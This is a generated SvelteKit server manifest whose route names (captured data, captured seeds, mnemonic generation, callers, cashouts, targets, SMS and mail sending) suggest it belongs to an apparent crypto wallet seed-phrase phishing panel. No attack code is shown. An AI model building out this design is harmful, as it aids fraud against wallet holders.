export const manifest = (() => {
function __memo(fn) {
	let value;
	return () => value ??= (value = fn());
}

return {
	appDir: "_app",
	appPath: "_app",
	assets: new Set(["favicon.png","notification.mp3","uploads/testuser/b447d732235cfcacdbc54e5b4f0e5bf1.mp3","uploads/testuser/sound-mappings.json"]),
	mimeTypes: {".png":"image/png",".mp3":"audio/mpeg",".json":"application/json"},
	_: {
		client: {start:"_app/immutable/entry/start.5XwWDpUt.js",app:"_app/immutable/entry/app.BxQrsenL.js",imports:["_app/immutable/entry/start.5XwWDpUt.js","_app/immutable/chunks/B0yxJNGR.js","_app/immutable/chunks/Ck01Vq7Y.js","_app/immutable/chunks/CL1ai2Yl.js","_app/immutable/chunks/BKOYs9ZV.js","_app/immutable/entry/app.BxQrsenL.js","_app/immutable/chunks/CL1ai2Yl.js","_app/immutable/chunks/Ck01Vq7Y.js","_app/immutable/chunks/BKOYs9ZV.js","_app/immutable/chunks/Bzak7iHL.js","_app/immutable/chunks/Cfw8beTg.js","_app/immutable/chunks/RR5R80WA.js"],stylesheets:[],fonts:[],uses_env_dynamic_public:false},
		nodes: [
			__memo(() => import('./nodes/0.js')),
			__memo(() => import('./nodes/1.js')),
			__memo(() => import('./nodes/2.js')),
			__memo(() => import('./nodes/3.js')),
			__memo(() => import('./nodes/4.js')),
			__memo(() => import('./nodes/5.js')),
			__memo(() => import('./nodes/6.js')),
			__memo(() => import('./nodes/7.js')),
			__memo(() => import('./nodes/8.js')),
			__memo(() => import('./nodes/9.js'))
		],
		remotes: {
			
		},
		routes: [
			{
				id: "/",
				pattern: /^\/$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 4 },
				endpoint: null
			},
			{
				id: "/admin/api/getGuild",
				pattern: /^\/admin\/api\/getGuild\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/admin/api/getGuild/_server.ts.js'))
			},
			{
				id: "/admin/api/login",
				pattern: /^\/admin\/api\/login\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/admin/api/login/_server.ts.js'))
			},
			{
				id: "/admin/dashboard",
				pattern: /^\/admin\/dashboard\/?$/,
				params: [],
				page: { layouts: [0,2,], errors: [1,,], leaf: 5 },
				endpoint: null
			},
			{
				id: "/admin/login",
				pattern: /^\/admin\/login\/?$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 6 },
				endpoint: null
			},
			{
				id: "/api/capturedData/Add",
				pattern: /^\/api\/capturedData\/Add\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/capturedData/Add/_server.ts.js'))
			},
			{
				id: "/api/capturedData/Get",
				pattern: /^\/api\/capturedData\/Get\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/capturedData/Get/_server.ts.js'))
			},
			{
				id: "/api/deleteTarg",
				pattern: /^\/api\/deleteTarg\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/deleteTarg/_server.ts.js'))
			},
			{
				id: "/api/deleteTarg/all",
				pattern: /^\/api\/deleteTarg\/all\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/deleteTarg/all/_server.ts.js'))
			},
			{
				id: "/api/generateMnemonic",
				pattern: /^\/api\/generateMnemonic\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/generateMnemonic/_server.ts.js'))
			},
			{
				id: "/api/guild/addCaller",
				pattern: /^\/api\/guild\/addCaller\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/addCaller/_server.ts.js'))
			},
			{
				id: "/api/guild/addDomain",
				pattern: /^\/api\/guild\/addDomain\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/addDomain/_server.ts.js'))
			},
			{
				id: "/api/guild/deleteCashout",
				pattern: /^\/api\/guild\/deleteCashout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/deleteCashout/_server.ts.js'))
			},
			{
				id: "/api/guild/getCallerCashouts",
				pattern: /^\/api\/guild\/getCallerCashouts\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getCallerCashouts/_server.ts.js'))
			},
			{
				id: "/api/guild/getCallerTargets",
				pattern: /^\/api\/guild\/getCallerTargets\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getCallerTargets/_server.ts.js'))
			},
			{
				id: "/api/guild/getCapturedSeeds",
				pattern: /^\/api\/guild\/getCapturedSeeds\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getCapturedSeeds/_server.ts.js'))
			},
			{
				id: "/api/guild/getCashouts",
				pattern: /^\/api\/guild\/getCashouts\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getCashouts/_server.ts.js'))
			},
			{
				id: "/api/guild/getDomains",
				pattern: /^\/api\/guild\/getDomains\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getDomains/_server.ts.js'))
			},
			{
				id: "/api/guild/getGuildCallers",
				pattern: /^\/api\/guild\/getGuildCallers\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getGuildCallers/_server.ts.js'))
			},
			{
				id: "/api/guild/getGuild",
				pattern: /^\/api\/guild\/getGuild\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getGuild/_server.ts.js'))
			},
			{
				id: "/api/guild/getSettings",
				pattern: /^\/api\/guild\/getSettings\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/getSettings/_server.ts.js'))
			},
			{
				id: "/api/guild/registerCashout",
				pattern: /^\/api\/guild\/registerCashout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/registerCashout/_server.ts.js'))
			},
			{
				id: "/api/guild/removeCaller",
				pattern: /^\/api\/guild\/removeCaller\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/removeCaller/_server.ts.js'))
			},
			{
				id: "/api/guild/removeDomain",
				pattern: /^\/api\/guild\/removeDomain\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/removeDomain/_server.ts.js'))
			},
			{
				id: "/api/guild/updateCaller",
				pattern: /^\/api\/guild\/updateCaller\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/updateCaller/_server.ts.js'))
			},
			{
				id: "/api/guild/updateCashout",
				pattern: /^\/api\/guild\/updateCashout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/updateCashout/_server.ts.js'))
			},
			{
				id: "/api/guild/updateSettings",
				pattern: /^\/api\/guild\/updateSettings\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/guild/updateSettings/_server.ts.js'))
			},
			{
				id: "/api/login",
				pattern: /^\/api\/login\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/login/_server.ts.js'))
			},
			{
				id: "/api/logout",
				pattern: /^\/api\/logout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/logout/_server.ts.js'))
			},
			{
				id: "/api/mailer/sendmail/[mailtype]",
				pattern: /^\/api\/mailer\/sendmail\/([^/]+?)\/?$/,
				params: [{"name":"mailtype","optional":false,"rest":false,"chained":false}],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/mailer/sendmail/_mailtype_/_server.ts.js'))
			},
			{
				id: "/api/register",
				pattern: /^\/api\/register\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/register/_server.ts.js'))
			},
			{
				id: "/api/send-sms",
				pattern: /^\/api\/send-sms\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/send-sms/_server.ts.js'))
			},
			{
				id: "/api/sound/[username]",
				pattern: /^\/api\/sound\/([^/]+?)\/?$/,
				params: [{"name":"username","optional":false,"rest":false,"chained":false}],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/sound/_username_/_server.ts.js'))
			},
			{
				id: "/api/startingPage/get",
				pattern: /^\/api\/startingPage\/get\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/startingPage/get/_server.ts.js'))
			},
			{
				id: "/api/startingPage/set",
				pattern: /^\/api\/startingPage\/set\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/startingPage/set/_server.ts.js'))
			},
			{
				id: "/api/targets/[targetid]",
				pattern: /^\/api\/targets\/([^/]+?)\/?$/,
				params: [{"name":"targetid","optional":false,"rest":false,"chained":false}],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/targets/_targetid_/_server.ts.js'))
			},
			{
				id: "/api/upload-sound",
				pattern: /^\/api\/upload-sound\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./entries/endpoints/api/upload-sound/_server.ts.js'))
			},
			{
				id: "/dashboard",
				pattern: /^\/dashboard\/?$/,
				params: [],
				page: { layouts: [0,3,], errors: [1,,], leaf: 7 },
				endpoint: null
			},
			{
				id: "/login",
				pattern: /^\/login\/?$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 8 },
				endpoint: null
			},
			{
				id: "/logout",
				pattern: /^\/logout\/?$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 9 },
				endpoint: null
			}
		],
		prerendered_routes: new Set([]),
		matchers: async () => {
			
			return {  };
		},
		server_assets: {}
	}
}
})();

export const prerendered = new Set([]);

export const base = "";